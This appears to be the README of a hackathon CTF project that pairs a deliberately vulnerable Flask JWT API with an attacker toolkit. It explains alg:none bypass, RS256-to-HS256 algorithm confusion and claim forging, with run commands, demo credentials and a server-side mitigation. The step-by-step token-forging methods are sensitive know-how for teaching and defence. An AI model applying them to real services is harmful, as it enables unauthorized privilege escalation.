# JWT Authentication Bypass & Algorithm Confusion Toolkit
### Hackathon Project — MITRE ATT&CK T1550.001

> ⚠️ **Educational / CTF Use Only** — Do not deploy the vulnerable API in any production or internet-accessible environment.

---

## What This Is

A fully working demonstration of real-world JWT authentication vulnerabilities:

| # | Attack | CVE | Impact |
|---|---|---|---|
| 1 | **alg:none bypass** | CVE-2015-9235 | Skip signature verification entirely |
| 2 | **RS256→HS256 confusion** | CVE-2016-5431 | Forge tokens with public key as secret |
| 3 | **Claim forging** | — | Escalate role=user → role=admin |

Capturing the flag (`FLAG{jwt_bypass_success}`) from `/admin` demonstrates a complete privilege escalation.

---

## Team Structure

| Person | Role | Files |
|---|---|---|
| **Person 1** | Vulnerable API + JWT Auth | `vulnerable-api/` |
| **Person 2** | Offensive Attack Toolkit | `attacker-toolkit/` |
| **Person 3** | Demo, Hardening, Docs | `docs/`, `README.md` |

---

## Quick Start (5 minutes)

### Option A — Local Python

```bash
# 1. Generate RSA keys
cd vulnerable-api
pip install -r requirements.txt
python generate_keys.py

# 2. Start the API
python app.py
# Running on http://localhost:5000

# 3. Run the attacks (in a new terminal)
cd ../attacker-toolkit
pip install -r requirements.txt

# Attack 1: alg:none
python none_attack.py

# Attack 2: RS256→HS256 confusion
python alg_confusion.py

# Attack 3: Manual claim forging
python forge_claims.py --action decode --token <PASTE_TOKEN_HERE>
python forge_claims.py --action forge-none --token <TOKEN> --set role=admin
```

### Option B — Docker

```bash
# Build and start everything
docker compose up --build

# In a separate terminal, run attacks:
docker compose exec attacker python none_attack.py --target http://api:5000
docker compose exec attacker python alg_confusion.py --target http://api:5000
```

---

## API Endpoints

| Method | Endpoint | Auth | Description |
|---|---|---|---|
| GET | `/` | None | API info |
| POST | `/login` | None | Get JWT token |
| GET | `/profile` | JWT | View your profile |
| GET | `/admin` | JWT (admin) | 🚩 **FLAG here** |
| GET | `/public-key` | None | RSA public key (for attacks) |

### Login

```bash
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "alice", "password": "password123", "alg": "HS256"}'
```

### Users

| Username | Password | Role |
|---|---|---|
| `alice` | `password123` | user |
| `bob` | `letmein` | user |
| `admin` | `adm1n$ecret` | admin |

---

## Attack Commands

### Attack 1 — alg:none

```bash
python attacker-toolkit/none_attack.py \
  --target http://localhost:5000 \
  --username alice \
  --password password123
```

### Attack 2 — RS256→HS256 Confusion

```bash
python attacker-toolkit/alg_confusion.py \
  --target http://localhost:5000
```

### Attack 3 — Claim Forging

```bash
# First get a token
TOKEN=$(curl -s -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Forge admin token
python attacker-toolkit/forge_claims.py \
  --action forge-none \
  --token $TOKEN \
  --set role=admin sub=hacker

# Use forged token
curl http://localhost:5000/admin \
  -H "Authorization: Bearer <FORGED_TOKEN>"
```

---

## Project Structure

```
jwt-auth-bypass-toolkit/
├── vulnerable-api/
│   ├── app.py              Flask API with intentional vulnerabilities
│   ├── generate_keys.py    RSA key pair generator
│   ├── requirements.txt
│   ├── Dockerfile
│   └── keys/
│       ├── private.pem     RS256 signing key
│       └── public.pem      RS256 verification key
│
├── attacker-toolkit/
│   ├── none_attack.py      Attack 1: alg:none bypass
│   ├── alg_confusion.py    Attack 2: RS256→HS256 confusion
│   ├── forge_claims.py     Attack 3: arbitrary claim forging
│   ├── utils.py            Shared helpers
│   └── requirements.txt
│
├── docs/
│   ├── hardening.md        Security fixes + secure code examples
│   ├── demo-flow.md        Step-by-step demo + Postman guide
│   └── architecture.md     System diagrams + CVE mapping
│
├── docker-compose.yml
└── README.md               This file
```

---

## How Each Vulnerability Works

### 1. alg:none

JWTs have three base64url-encoded parts: `header.payload.signature`.

If a server trusts the `alg` field in the header and that field is `"none"`,
it skips signature verification. An attacker can:

1. Decode any JWT
2. Modify `role=user` → `role=admin`
3. Set `alg=none` in the header
4. Remove the signature (just a trailing dot)
5. Server accepts the unsigned, forged token

### 2. RS256→HS256 Algorithm Confusion

RS256 uses asymmetric crypto: private key signs, public key verifies.

When a server accepts HS256, it uses a secret as both signing and verification key.
A buggy implementation that checks `if alg == HS256: verify_with(public_key_pem)` is
exploitable because the attacker can:

1. Fetch the public key (it's public by definition)
2. Sign a forged JWT with HS256 using the PUBLIC key as the HMAC secret
3. Server verifies with the same public key → signature matches → admin access!

### 3. Claim Forging

Once you have a bypass (alg:none or confusion), you can set any claim:
- `role=admin`
- `sub=admin`
- `exp=9999999999` (far future expiry)
- Custom application claims

---

## Mitigation Summary

```python
# ✅ SECURE — always specify algorithms server-side
jwt.decode(
    token,
    key=PUBLIC_KEY,
    algorithms=["RS256"],      # explicit allowlist — never trust header's alg
    options={"require": ["exp", "iat", "sub"]},
)
```

See [docs/hardening.md](docs/hardening.md) for the complete secure implementation.

---

## References

- [PortSwigger JWT Labs](https://portswigger.net/web-security/jwt)
- [RFC 7519 — JWT Specification](https://datatracker.ietf.org/doc/html/rfc7519)
- [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235) — alg:none
- [CVE-2016-5431](https://nvd.nist.gov/vuln/detail/CVE-2016-5431) — Algorithm confusion
- [MITRE ATT&CK T1550.001](https://attack.mitre.org/techniques/T1550/001/)
